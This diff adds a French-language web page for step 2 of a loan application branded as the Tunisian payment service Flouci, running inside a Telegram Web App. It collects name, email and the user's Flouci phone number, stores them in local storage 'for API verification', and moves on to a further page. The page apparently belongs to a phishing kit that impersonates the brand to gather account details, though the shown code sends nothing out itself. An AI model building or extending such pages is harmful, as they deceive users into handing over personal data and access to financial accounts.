@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Flouci Tunisie - Demande de Prêt</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --flouci-orange: #FF5E00;       /* Flouci Signature Orange */
+            --flouci-orange-dark: #E05200;
+            --flouci-dark: #1E252B;         /* Dark Slate Text */
+            --flouci-green: #10B981;        /* Accent Green */
+            --bg-color: #F4F5F7;            /* Clean light background */
+            --card-bg: #FFFFFF;
+            --text-main: #1E252B;
+            --text-muted: #6B7280;
+            --input-border: #E5E7EB;
+            --input-focus: #FF5E00;
+            --btn-gray: #F3F4F6;
+            --btn-gray-text: #4B5563;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation Bar - Clean White with Orange Branding */
+        .app-header {
+            width: 100%;
+            background-color: #FFFFFF;
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            border-bottom: 1px solid #E5E7EB;
+        }
+
+        .back-btn-top {
+            color: var(--flouci-dark);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            color: var(--flouci-orange);
+        }
+
+        .header-title .region {
+            color: #FFFFFF;
+            font-size: 11px;
+            margin-left: 8px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: var(--flouci-orange);
+            padding: 2px 7px;
+            border-radius: 10px;
+        }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: var(--flouci-dark);
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            border: 1px solid #E5E7EB;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 25px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 24px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 32px;
+            width: 100%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 6px;
+            background-color: #E5E7EB;
+            border-radius: 3px;
+        }
+
+        .step-bar.active {
+            background-color: var(--flouci-orange);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--flouci-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 2px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #FFFFFF;
+            color: var(--text-main);
+            outline: none;
+            width: 100%;
+            transition: border-color 0.2s;
+        }
+
+        .form-control::placeholder {
+            color: #9CA3AF;
+        }
+
+        .form-control:focus {
+            border-color: var(--flouci-orange);
+        }
+
+        /* Phone Input Group */
+        .phone-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-prefix {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background-color: #FFF8F5;
+            border: 2px solid #FFE4D6;
+            border-radius: 10px;
+            padding: 0 14px;
+            font-weight: 700;
+            font-size: 15px;
+            color: var(--flouci-dark);
+            white-space: nowrap;
+        }
+
+        .flag-icon {
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .phone-hint {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 8px;
+        }
+
+        /* Buttons Container */
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-prev:hover {
+            background-color: #E5E7EB;
+        }
+
+        .btn-next {
+            background-color: var(--flouci-orange);
+            color: #FFFFFF;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s, transform 0.1s;
+            box-shadow: 0 4px 14px rgba(255, 94, 0, 0.35);
+        }
+
+        .btn-next:active {
+            background-color: var(--flouci-orange-dark);
+            transform: scale(0.99);
+        }
+
+        /* Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #9CA3AF;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Clean Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span>flouci</span><span class="region">TN</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demande de Prêt</h1>
+    <div class="subtext">Étape 2 sur 3</div>
+
+    <!-- Step Bar Progress Indicators (Steps 1 & 2 Active) -->
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <!-- Personal Info Form -->
+    <form id="step2Form" onsubmit="goNext(event)">
+        <div class="form-group">
+            <label for="firstName">Prénom</label>
+            <input type="text" id="firstName" class="form-control" placeholder="Mohamed" required>
+        </div>
+
+        <div class="form-group">
+            <label for="lastName">Nom</label>
+            <input type="text" id="lastName" class="form-control" placeholder="Ben Ali" required>
+        </div>
+
+        <div class="form-group">
+            <label for="email">Adresse Email</label>
+            <input type="email" id="email" class="form-control" placeholder="mohamed.benali@exemple.tn" required>
+        </div>
+
+        <div class="form-group">
+            <label for="phone">Numéro de Téléphone Flouci</label>
+            <div class="phone-group">
+                <div class="country-prefix">
+                    <span class="flag-icon">🇹🇳</span>
+                    <span>+216</span>
+                </div>
+                <input type="tel" id="phone" class="form-control" placeholder="22123456" maxlength="8" pattern="[0-9]{8}" required>
+            </div>
+            <div class="phone-hint">8 chiffres (ex: 22123456)</div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
+            <button type="submit" class="btn-next">SUIVANT</button>
+        </div>
+    </form>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 Flouci Tunisie - Kaoun
+</div>
+
+<script>
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing saved user info
+        const fName = localStorage.getItem('firstName');
+        const lName = localStorage.getItem('lastName');
+        const email = localStorage.getItem('email');
+        const phone = localStorage.getItem('phone');
+
+        if (fName) document.getElementById('firstName').value = fName;
+        if (lName) document.getElementById('lastName').value = lName;
+        if (email) document.getElementById('email').value = email;
+        if (phone) document.getElementById('phone').value = phone;
+    };
+
+    function goNext(event) {
+        event.preventDefault();
+
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !email || !phone) {
+            alert("Veuillez remplir tous les champs.");
+            return;
+        }
+
+        if (!/^\d{8}$/.test(phone)) {
+            alert("Veuillez entrer un numéro Flouci valide à 8 chiffres.");
+            return;
+        }
+
+        // Save stored details
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('email', email);
+        localStorage.setItem('phone', phone);
+        
+        // Save phone specifically for API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+</script>
+
+</body>
+</html>
